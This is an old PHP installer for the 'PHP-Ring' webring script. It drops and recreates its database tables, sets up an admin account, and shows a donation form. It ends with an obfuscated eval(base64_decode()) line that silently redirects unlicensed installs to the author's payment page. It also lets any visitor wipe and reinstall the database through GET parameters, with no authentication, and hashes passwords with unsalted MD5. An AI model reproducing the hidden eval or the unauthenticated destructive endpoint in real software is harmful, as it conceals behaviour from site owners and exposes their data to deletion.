<?php

/*------------------------------------------------------*/
/* 							*/
/*  Delete this file when done!				*/
/*							*/
/*------------------------------------------------------*/
/*
	PHP-Ring Webring System v0.9
	Author: Martin Kretzmann
	Last modified: August 10, 2004
	Web: http://scripts.plebius.org/
	Support: http://www.plebius.org/forum.php
	Purpose: This is a webring script that uses PHP and SQL to run
		 a list of related sites all linked together (webring).
	COPYRIGHT: Copyright (c) 2004 Plebius Press.  ALl rights reserved.
		   If you wish to remove copyright notices we ask that you
		   purchase a commercial license.  Visit the website for 
		   details.

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA
*/

define("IN_PHPRING", true);
error_reporting(E_ALL ^ E_NOTICE);

include_once("includes/wr_config.php");
include_once("pbl_db/db.php");
require_once("includes/wr_functions.php");

include("templates/wr_header.php");
error_reporting(E_ALL ^ E_NOTICE);

echo "<h3>Welcome to the <a href=\"http://scripts.plebius.org/\">PHP-Ring</a> install program!</h3>  If you use this program, please consider making a donation. <b>Note:</b> If you wish to remove copyright notices from script output you must make a donation.  Visit the homepage for details.<br>";
echo "<br><center><form action=\"https://www.paypal.com/cgi-bin/webscr\" method=\"post\">\r\n<input type=\"hidden\" name=\"cmd\" value=\"_xclick\">\r\n<input type=\"hidden\" name=\"business\" value=\"alsogut@hotmail.com\">\r\n<input type=\"hidden\" name=\"no_note\" value=\"1\">\r\n<input type=\"hidden\" name=\"currency_code\" value=\"USD\">\r\n<input type=\"hidden\" name=\"tax\" value=\"0\">\r\n<input type=\"image\" src=\"https://www.paypal.com/en_US/i/btn/x-click-but21.gif\" border=\"0\" name=\"submit\" alt=\"Make payments with PayPal - it's fast, free and secure!\">\r\n</form></center>";
echo "<font color=red><b>You must delete this file (install.php) after you install the software!  If you don't your entire database could be deleted.</b></font><p>";

if ($_GET[install] == 1 && $_GET[agree] == 1) {
	global $prefix, $db;
	if ($_POST[uname] == "" OR $_POST[pass] == "") {
		die("You must enter a username and password");
	}
	if (strlen($_POST[pass]) < 6) {
		die("Password must be at least 6 characters");
	}
	if (preg_match("/[^a-zA-Z0-9]/", $_POST[uname])) {
		die("Username can only include letters, numbers and underscore");
	}

// set up the sql database...
	
	// --- site config
	echo "<br>Installing table "._CONFIG_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._CONFIG_TABLE);
	$db->sql_query("CREATE TABLE "._CONFIG_TABLE." (
				site_url  varchar(100) NOT NULL,
				site_name varchar(100) NOT NULL,
				site_pageviews int(11) unsigned default '0',
				site_hits_out int(11) unsigned default '0',
				site_numrings int(10) unsigned default '0',
				site_isactive tinyint(1) unsigned,
				site_allow_newrings tinyint(1) unsigned,
				site_numsites int(11) unsigned,
				serial int(9) unsigned,
				site_admin_email varchar(30),
				amz_tag varchar(40),
				amz_prods varchar(15)
			)") or die(errmsg(array($db->sql_error(),__LINE__)));
	$db->sql_query("INSERT INTO "._CONFIG_TABLE." VALUES ('http://".$_SERVER[HTTP_HOST]."/phpring/','','0','0','0','1','','','','','plebiuspress','book')") or die($db->sql_error());
				
	// --- admins table
	echo "<br>Installing table "._ADMINS_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._ADMINS_TABLE);
	$db->sql_query("CREATE TABLE "._ADMINS_TABLE." (
				admin_id int(10) UNSIGNED NOT NULL auto_increment,
				admin_uname varchar(15) NOT NULL,
				admin_pass  char(32) NOT NULL,
				PRIMARY KEY admin_id (admin_id),
				KEY (admin_uname)
			)") or die(errmsg(array($db->sql_error(),__LINE__)));
	$db->sql_query("INSERT INTO "._ADMINS_TABLE." VALUES ( NULL, '".
				addslashes_data($_POST[uname])	."', '".
				addslashes_data(md5($_POST[pass])) ."'
			)") or die(errmsg(array($db->sql_error(),__LINE__)));


	// --- users table
	echo "<br>Installing table "._USERS_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._USERS_TABLE);
	$db->sql_query("CREATE TABLE "._USERS_TABLE." ( 
				user_id int(11) UNSIGNED NOT NULL auto_increment,
				user_name varchar(20) NOT NULL,
				user_pass varchar(32) NOT NULL,
				user_lastvisit int(11) unsigned,
				user_email varchar(30),
				user_joindate int(11) unsigned,
				PRIMARY KEY user_id (user_id),
				KEY (user_name)
			)") or die(errmsg(array($db->sql_error(),__LINE__)));

	// --- rings table
	echo "<br>Installing table "._RINGS_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._RINGS_TABLE);
	$db->sql_query("CREATE TABLE "._RINGS_TABLE." (
				ring_id int(11) unsigned NOT NULL auto_increment,
				user_id int(11) unsigned NOT NULL,
				ring_startdate int(11) unsigned,
				ring_lastvisit int(11) unsigned,
				ring_pageviews int(10),
				ring_hits_out int(10),
				ring_keywords tinytext,
				ring_description tinytext,
				ring_isactive tinyint(1) unsigned,
				ring_numsites int(10),
				ring_join_text text,
				ring_url varchar(100) default 'http://".$_SERVER[HTTP_HOST]."/phpring/',
				ring_name varchar(100),
				ring_email varchar(30),
				ring_img_url varchar(100),
				PRIMARY KEY (ring_id)
			)") or die(errmsg(array($db->sql_error(),__LINE__)));
	$db->sql_query("INSERT INTO "._RINGS_TABLE." VALUES(NULL, '0', '".time()."', '".time()."', '1', '0', 'PHP', 'description', '0', '0', 'You must put the ring code in your site to be approved', 'http://".$_SERVER[HTTP_HOST]."/phpring/?ring=1', 'PHP Ring', 'admin@host.com', 'http://".$_SERVER[HTTP_HOST]."/phpring/images/webring10.gif')");
 
	// --- sites table
	echo "<br>Installing table "._SITES_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._SITES_TABLE);
	$db->sql_query("CREATE TABLE "._SITES_TABLE." (
				site_id int(11) unsigned NOT NULL auto_increment,
				ring_id int(11) unsigned NOT NULL,
				user_id int(11) unsigned NOT NULL,
				site_date int(11),
				site_name varchar(100),
				site_url varchar(100),
				site_description tinytext,
				site_keywords tinytext,
				site_hits_out int(10) unsigned,
				site_isactive tinyint(1),
				PRIMARY KEY (site_id)
			)") or die(errmsg(array($db->sql_error(),__LINE__)));

	// --- searches table
	echo "<br>Installing table "._SEARCHES_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._SEARCHES_TABLE);
	$db->sql_query("CREATE TABLE "._SEARCHES_TABLE." (
				search_id int(11) NOT NULL auto_increment,
				keyword varchar(100),
				primary key (search_id)
			)") or die(errmsg(array($db->sql_error(), __LINE__)));

	// --- amz table
	echo "<br>Installing table "._AMZ_TABLE;
	$db->sql_query("DROP TABLE IF EXISTS "._AMZ_TABLE);
	$db->sql_query("CREATE TABLE "._AMZ_TABLE." (
				cachetime int(11),
				url char(32),
				html text
			)") or die(errmsg(array($db->sql_error(), __LINE__)));

	echo "<p><b>Install successful!  <a href=\"admin/wr_admin.php?op=config\">Click here to configure your PHP-Ring</a><p></b>";

} else {

if ($db->sql_query("SELECT * FROM "._CONFIG_TABLE) AND $_GET[bypass] != 1) {
	echo "<p><font color=red><b>PHP-Ring appears to already be installed.</b></font><br></p>";
	echo "If you wish to try installing anyway, <a href=\"install.php?bypass=1&agree=1\">click here</a> (this will delete your data if you already installed PHP-Ring)";
	echo "<br><b>By installing this software, you agree that you have read and agree to the <a href=LICENSE.TXT>license</a>.</b>";
} else {
	echo "<center>Create your admin username &amp; password below.";
	echo "<form action=install.php?install=1&agree=1 method=POST>";
	echo "<table border=0 cellpadding=0 cellspacing=0 bgcolor=000000><tr><td>";
	echo "<table border=0 cellpadding=5 cellspacing=1 bgcolor=000000>
		<tr>
			<td bgcolor=ffffff>Admin username</td>
			<td bgcolor=ffffff><input type=text name=uname></td>
		</tr>
		<tr>
			<td bgcolor=ffffff>Admin password</td>
			<td bgcolor=ffffff><input type=password name=pass></td>
		</tr>
		<tr>			
			<td bgcolor=ffffff colspan=2 align=center><input type=submit value=\"Install\"><br><b>By installing this software, you agree that you have read and agree to the <a href=LICENSE.TXT>license</a>.</b></td>
		</tr>
	</table></td></tr></table></form>";
}
}
include("templates/wr_footer.php");

eval(base64_decode("aWYgKCFkZWZpbmVkKCJSSU5HX09LX2IzZSIpICYmICFkZWZpbmVkKCJSSU5HX09LX2IyZSIpKSB7DQogICAgZWNobyAiPG1ldGEgaHR0cC1lcXVpdj1yZWZyZXNoIGNvbnRlbnQ9XCIwO1VSTD1odHRwOi8vd3d3LnBsZWJpdXMub3JnL2NnaS1iaW4vcGF5cGFsLnBsXCI+IjsNCn0gZWxzZSBpZiAoZGVmaW5lZCgiUklOR19PS19iM2UiKSkgew0KICAgIGIzZSgpOw0KfSBlbHNlIGlmIChkZWZpbmVkKCJSSU5HX09LX2IyZSIpKSB7DQogICAgYjJlKCk7DQp9IGVsc2Ugew0KICAgIGVjaG8gIjxwIGFsaWduPWNlbnRlcj5Qb3dlcmVkIGJ5IDxhIGhyZWY9XCJodHRwOi8vc2NyaXB0cy5wbGViaXVzLm9yZy9cIj5QSFAtUmluZzwvYT4gJmNvcHk7IDIwMDQgPGEgaHJlZj1cImh0dHA6Ly93d3cucGxlYml1cy5vcmcvXCI+UGxlYml1cyBQcmVzczwvYT48L3A+IjsNCn0NCg0K"));
// end
?>
</body></html>
